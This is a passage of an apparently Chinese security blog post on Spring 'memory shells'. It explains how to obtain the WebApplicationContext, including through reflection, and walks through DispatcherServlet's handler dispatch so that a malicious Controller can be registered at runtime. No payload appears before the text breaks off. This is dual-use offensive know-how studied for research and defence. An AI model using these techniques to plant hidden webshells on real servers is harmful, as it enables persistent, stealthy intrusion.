class="name">container.version</span>&gt;</span> <span class="comment">&lt;!-- ★只改这一行 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.homeName</span>&gt;</span>jetty-home-$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">container.homeName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">container.zipUrl</span>&gt;</span>https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-home/$&#123;container.version&#125;/jetty-home-$&#123;container.version&#125;.zip<span class="tag">&lt;/<span class="name">container.zipUrl</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.group</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">jsp.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.artifact</span>&gt;</span>apache-jsp<span class="tag">&lt;/<span class="name">jsp.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp.version</span>&gt;</span>$&#123;container.version&#125;<span class="tag">&lt;/<span class="name">jsp.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- EL / Servlet 走 jakarta 系列 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.group</span>&gt;</span>jakarta.el<span class="tag">&lt;/<span class="name">el.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.artifact</span>&gt;</span>jakarta.el-api<span class="tag">&lt;/<span class="name">el.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el.version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">el.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.group</span>&gt;</span>jakarta.servlet<span class="tag">&lt;/<span class="name">servlet.group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.artifact</span>&gt;</span>jakarta.servlet-api<span class="tag">&lt;/<span class="name">servlet.artifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet.version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">servlet.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h1><h2 id="Spring-内存马"><a href="#Spring-内存马" class="headerlink" title="Spring 内存马"></a>Spring 内存马</h2><h3 id="WebApplicationContext"><a href="#WebApplicationContext" class="headerlink" title="WebApplicationContext"></a>WebApplicationContext</h3><p>对于内存马的注入，最重要的事情就是获取上下文，在 Tomcat 中获取说的上下文为 <code>StandardContext</code>，对于 Spring 获取的就是 <code>WebApplicationContext</code>。</p>
<h4 id="什么是-WebApplicationContext"><a href="#什么是-WebApplicationContext" class="headerlink" title="什么是 WebApplicationContext"></a>什么是 WebApplicationContext</h4><p><code>WebApplicationContext</code> 是 <strong>Spring 专门用于 Web 环境（如 Servlet 环境）</strong> 的 IoC 容器接口，你可以理解成 <strong>“Web 版的 ApplicationContext”</strong>。</p>
<p>在 <code>WebApplicationContext</code> 中，不仅能像普通的 Spring 容器一样管理和获取 Bean，还能够访问 <code>ServletContext</code>、支持 Web 特有的作用域（例如 <code>request</code>、<code>session</code>、<code>application</code>），以及处理主题（<code>ThemeSource</code>）等一系列专属于 Web 环境的功能。</p>
<p>在传统的 Spring MVC（非 Spring Boot）应用里，<code>WebApplicationContext</code> 通常会被划分为 <strong>两层</strong>：</p>
<ul>
<li><p><strong>Root WebApplicationContext（父容器）</strong>由 <code>ContextLoaderListener</code> 在应用启动时创建（默认读取 <code>/WEB-INF/applicationContext.xml</code>）。放<strong>通用基础设施</strong>：<code>DataSource</code>、<code>TxManager</code>、<code>Service</code>、<code>Repository</code>、工具类等。</p>
</li>
<li><p><strong>Child WebApplicationContext（子容器）</strong>每个 <code>DispatcherServlet</code> 启动时各自创建一个子容器（默认读取 <code>/WEB-INF/&lt;servlet-name&gt;-servlet.xml</code>）。放<strong>Web 层</strong>：<code>@Controller</code>、<code>HandlerMapping/Adapter</code>、视图解析器、<code>MessageConverter</code> 等。</p>
</li>
</ul>
<h5 id="Root-WebApplicationContext"><a href="#Root-WebApplicationContext" class="headerlink" title="Root WebApplicationContext"></a>Root WebApplicationContext</h5><p><code>ContextLoaderListener</code> 在<strong>应用启动</strong>时创建<strong>全局唯一的 Root WebApplicationContext</strong>（父容器），并把它放进 <code>ServletContext</code> 里，供后续所有 <code>DispatcherServlet</code> 作为“父亲”。</p>
<p>我们可以在 <code>web.xml</code> 中<strong>告诉 Spring 去哪里加载全局配置</strong>，以及<strong>注册一个监听器在应用启动时创建“全局（Root）容器”</strong>。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 告诉 Root 容器去哪个配置文件加载 bean --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 创建 Root WebApplicationContext 的监听器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果<strong>不写 <code>contextConfigLocation</code><strong>，Spring 会</strong>自动找</strong> <code>/WEB-INF/applicationContext.xml</code>。所以很多项目直接省略 <code>&lt;context-param&gt;</code>，只留 <code>ContextLoaderListener</code>。</p>
</li>
<li><p><code>applicationContext.xml</code> 通常放“<strong>非 Web 层</strong>”的东西：数据库、事务、Service、DAO、通用工具等。</p>
</li>
</ul>
<h5 id="Child-WebApplicationContext"><a href="#Child-WebApplicationContext" class="headerlink" title="Child WebApplicationContext"></a>Child WebApplicationContext</h5><p><code>DispatcherServlet</code> 是<strong>真正接收 HTTP 请求</strong>的 Servlet（继承 <code>HttpServlet</code>），负责<strong>分发到对应的 Controller</strong>。<br>每<strong>一个</strong> <code>DispatcherServlet</code> <strong>都会新建一个 Child WebApplicationContext</strong>（子容器），它的<strong>父亲</strong>就是上面的 Root 容器。</p>
<p>在 <strong>web.xml 里可以把 Spring MVC 的核心前端控制器 <code>DispatcherServlet</code> 配起来</strong>，并把它<strong>映射到哪些 URL 要交给它处理</strong>。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 别忘了 URL 映射（示例：拦所有） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>如果**不写 <code>contextConfigLocation</code>**，Spring 会找<br><code>/WEB-INF/&lt;servlet-name&gt;-servlet.xml</code>。上面 <code>&lt;servlet-name&gt;</code> 是 <code>dispatcherServlet</code>，所以默认就是 <code>/WEB-INF/dispatcherServlet-servlet.xml</code>。</li>
<li><code>dispatcherServlet-servlet.xml</code> 通常放“<strong>Web 层</strong>”的东西：<code>component-scan</code> 扫 <code>@Controller</code>、<code>RequestMappingHandlerMapping</code>&#x2F;<code>Adapter</code>、视图解析器、消息转换器等。</li>
</ul>
<h4 id="获取-WebApplicationContext"><a href="#获取-WebApplicationContext" class="headerlink" title="获取 WebApplicationContext"></a>获取 WebApplicationContext</h4><p>下面展示的四种获得当前代码运行时的上下文环境的方法中，<strong>推荐使用后面两种方法</strong>获得 <code>Child WebApplicationContext</code>。</p>
<p>这是因为：根据习惯，在很多应用配置中注册 Controller 的 component-scan 组件都配置在类似的 <code>dispatcherServlet-servlet.xml</code> 中，而不是全局配置文件 <code>applicationContext.xml</code> 中。</p>
<p>这样就导致 <code>RequestMappingHandlerMapping</code> 的实例 <code>bean</code> 只存在于 <code>Child WebApplicationContext</code> 环境中，而不是 <code>Root WebApplicationContext</code> 中。Root Context无法访问<code>Child Context</code>中定义的 <code>bean</code>，所以可能会导致 <code>Root WebApplicationContext</code> 获得不了 <code>RequestMappingHandlerMapping</code> 的实例 <code>bean</code> 的情况。</p>
<p>另外，在有些 Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code>、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 servlet 配置文件，这时候通过前两种方法是获取不到 <code>Root WebApplicationContext</code> 的。</p>
<h5 id="ContextLoader"><a href="#ContextLoader" class="headerlink" title="ContextLoader"></a>ContextLoader</h5><p>直接通过 <code>ContextLoader</code> 获取，获取到当前 <code>ContextLoader</code> 创建的 <code>WebApplicationContext</code>（一般 ContextLoader 会被 ban）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure></div>

<h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><p>该工具类的 <code>getWebApplicationContext</code> 方法也是获取到 <code>ContextLoaderListener</code> 所创建的 ROOT <code>WebApplicationContext</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是，在 spring 5 之后的的 <code>WebApplicationContextUtils</code> 已经没有 <code>getWebApplicationContext</code> 方法。</p>
<h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a>RequestContextUtils</h5><p>通过 <code>RequestContextHolder</code> 获取 <code>request</code>，然后获取 <code>servletRequest</code> 后通过 <code>RequestContextUtils</code> 获取 ROOT <code>WebApplicationContext</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure></div>

<h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a>getAttribute</h5><p>用 <code>RequestContextHolder</code> 方法直接从键值 <code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code> 中获取 Context 即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<h5 id="反射获取（仅适用于Springboot环境）"><a href="#反射获取（仅适用于Springboot环境）" class="headerlink" title="反射获取（仅适用于Springboot环境）"></a>反射获取（仅适用于Springboot环境）</h5><p>Springboot 初始化过程中会往 <code>org.springframework.context.support.LiveBeansView</code> 类的 <code>applicationContexts</code> 属性中添加 <code>org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext</code> 类的对象，这个类是 Springboot 里的类，所以这种方法仅适用于 Springboot。</p>
<p><code>applicationContexts</code> 属性定义如下所示：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;ConfigurableApplicationContext&gt; applicationContexts = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br></pre></td></tr></table></figure></div>

<p>因为使用了 <code>private static final</code> 修饰符，所以可以直接反射获取属性值。示例代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure></div>

<h3 id="Controller-内存马"><a href="#Controller-内存马" class="headerlink" title="Controller 内存马"></a>Controller 内存马</h3><p>Spring 中的 <strong>Controller</strong> 是一种负责接收用户请求，调用相应的业务逻辑（Service 层），并返回数据或视图的组件，属于 MVC（Model-View-Controller）架构的核心组成部分。</p>
<p>简单说，Controller 本质上就是一个封装了复杂逻辑、使用更简单、更高级抽象的 Servlet。它具有如下功能：</p>
<ul>
<li>Controller 决定一个请求 URL 应该由哪个方法处理。</li>
<li>Controller 将用户请求转为 Java 对象。</li>
<li>Controller 调用业务逻辑（Service）处理数据。</li>
<li>Controller 决定响应（返回视图页面或 JSON&#x2F;XML 数据）。</li>
</ul>
<p>因此如果我们能够像注册 Servlet 那样动态注册一个恶意 Controller，那么同样可以实现内存马功能。</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><h5 id="Controller-派发流程"><a href="#Controller-派发流程" class="headerlink" title="Controller 派发流程"></a>Controller 派发流程</h5><p><code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code> 到我们注册的 Controller 的处理函数之间有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">at com.example.HelloController.hello(HelloController.java:12)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)</span><br><span class="line">at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1072)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:965)</span><br></pre></td></tr></table></figure></div>

<p>在 <code>doDispatch</code> 方法中，首先通过 <code>getHandler</code> 方法，获取到对应的Handler，然后再调用 <code>getHandlerAdapter</code> 方法获取到对应的适配器，最后去调用 <code>ha.handler</code>。</p>
<p>在 Spring MVC 的 <code>DispatcherServlet</code> 的核心方法 <code>doDispatch</code> 中：</p>
<ol>
<li><p><strong>通过调用 <code>getHandler(request)</code> 方法</strong>，根据请求的 URL、HTTP方法等信息，找到对应的<strong>处理器（Handler）</strong>。</p>
<ul>
<li>处理器一般是具体的 Controller 方法。</li>
</ul>
</li>
<li><p>拿到 Handler 后，Spring <strong>调用 <code>getHandlerAdapter(handler)</code> 方法</strong>，根据当前 Handler 的类型，找到一个<strong>合适的处理器适配器（HandlerAdapter）</strong>。</p>
<ul>
<li><code>HandlerAdapter</code> 统一了调用不同类型处理器的接口。</li>
<li>常见适配器如：<code>RequestMappingHandlerAdapter</code> 用于调用 <code>@RequestMapping</code> 标注的方法。</li>
</ul>
</li>
<li><p>最终，通过调用 <code>ha.handle(request, response, handler)</code> 方法，由适配器完成对具体 Handler 方法的调用。</p>
<ul>
<li>适配器负责参数绑定、方法调用、返回值处理等逻辑。</li>
<li>Controller 方法的执行结果一般封装成 <code>ModelAndView</code> 或直接写回响应。</li>
</ul>
</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为当前请求解析并定位处理器（通常是某个 @Controller/@RequestMapping 方法）</span></span><br><span class="line">mappedHandler = getHandler(processedRequest);</span><br><span class="line"><span class="keyword">if</span> (mappedHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 没有匹配到任何处理器：按 Spring 策略返回 404/抛出异常等</span></span><br><span class="line">    noHandlerFound(processedRequest, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于已定位到的处理器，选择合适的 HandlerAdapter（统一的调用适配层）</span></span><br><span class="line"><span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若处理器支持“最后修改时间”语义，则尝试处理 HTTP 缓存相关逻辑（Last-Modified / If-Modified-Since）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isGet</span> <span class="operator">=</span> HttpMethod.GET.matches(method);</span><br><span class="line"><span class="keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;</span><br><span class="line">    <span class="comment">// 向处理器查询资源的 lastModified 值（-1 表示不支持）</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">    <span class="comment">// 根据请求头判断资源是否未修改：若未修改，会设置 304 Not Modified 等相关响应头</span></span><br><span class="line">    <span class="comment">// 仅在 GET 场景下提前返回；HEAD 场景下通常继续后续流程以补全响应头</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 HandlerInterceptor 的 preHandle 链；若有拦截器返回 false，则中止后续处理（拦截器可能已写入响应）</span></span><br><span class="line"><span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际调用目标处理器（Controller 方法），返回 ModelAndView（REST 场景下可能为 null，直接写入响应体）</span></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br></pre></td></tr></table></figure></div>

<p>在 <code>getHandler</code> 方法中，会寻找我们访问路径所对应的 <code>HandlerMapping</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为当前请求返回一个 HandlerExecutionChain（包含“处理器 + 拦截器链”）。</span></span><br><span class="line"><span class="comment"> * 按已注册的 HandlerMapping 顺序依次尝试，命中第一个即可返回；</span></span><br><span class="line"><span class="comment"> * 如果没有任何 HandlerMapping 能处理该请求，则返回 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 按顺序遍历所有 HandlerMapping（顺序由 Ordered/Order 决定，已在初始化阶段排好）</span></span><br><span class="line">        <span class="keyword">for</span> (HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line">            <span class="comment">// 让每个 HandlerMapping 尝试基于当前请求解析出“处理器执行链”</span></span><br><span class="line">            <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">            <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 命中：返回“处理器 +（零个或多个）HandlerInterceptor”组合</span></span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 所有 HandlerMapping 都无法匹配该请求（后续 doDispatch 会走 noHandlerFound -&gt; 一般是 404）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>HandlerMappings</code> 中存在多个 <code>HandlerMapping</code>，通过迭代器进行遍历，找到匹配的 <code>HandlerMapping</code>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">this.handlerMappings = &#123;ArrayList@5832&#125;  size = 6</span><br><span class="line"> 0 = &#123;RequestMappingHandlerMapping@5851&#125; </span><br><span class="line"> 1 = &#123;WelcomePageHandlerMapping@5852&#125; </span><br><span class="line"> 2 = &#123;BeanNameUrlHandlerMapping@5853&#125; </span><br><span class="line"> 3 = &#123;RouterFunctionMapping@5854&#125; </span><br><span class="line"> 4 = &#123;WelcomePageNotAcceptableHandlerMapping@5855&#125; </span><br><span class="line"> 5 = &#123;SimpleUrlHandlerMapping@5856&#125; </span><br></pre></td></tr></table></figure></div>

<p><code>getHandler</code> 函数之后有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.lookupHandlerMethod(AbstractHandlerMethodMapping.java:402)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.getHandlerInternal(AbstractHandlerMethodMapping.java:383)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.RequestMappingInfoHandlerMapping.getHandlerInternal(RequestMappingInfoHandlerMapping.java:125)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.RequestMappingInfoHandlerMapping.getHandlerInternal(RequestMappingInfoHandlerMapping.java:67)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:498)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1266)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1048)</span><br></pre></td></tr></table></figure></div>

<p>在 <code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal</code> 方法中：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定请求查找并返回一个 HandlerMethod（控制器方法）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 1) 